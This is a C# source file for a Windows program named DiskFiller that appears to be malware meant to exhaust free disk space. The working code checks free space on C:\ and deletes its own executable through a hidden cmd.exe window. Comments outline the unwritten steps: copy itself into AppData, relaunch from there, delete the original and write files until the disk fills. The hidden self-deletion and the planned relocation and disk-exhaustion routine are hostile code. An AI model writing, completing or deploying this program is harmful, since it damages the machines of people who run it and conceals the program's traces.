using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;



namespace DiskFiller
{
    internal partial class DiskFiller : Form
    {
        internal DiskFiller()
        {
            if (GetDiskSpace(@"C:\") <= 4)
            {
                DestroySelf();
            }
            


            // Define all needed variables



            // Check if file is not in wanted folder
                // Copy application to appdata
                // Start application from new folder
                // Exit and destroy current application



            // Prepare the content which will be written to the files



            // Start the writing



            InitializeComponent();
        }

        /// <summary>
        /// Returns disk space of the given disk in GB
        /// Example for a disk name -> "C:\"
        /// </summary>
        private double GetDiskSpace(string diskName)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.Name.Equals(diskName))
                {
                    return drive.TotalFreeSpace / (1024 * 1024 * 1024);
                }
            }

            return -1;
        }

        /// <summary>
        /// Delete application in 1 second and close the process in the meantime
        /// </summary>
        private void DestroySelf()
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch
            {

            }

            Environment.Exit(0);
        }
    }
}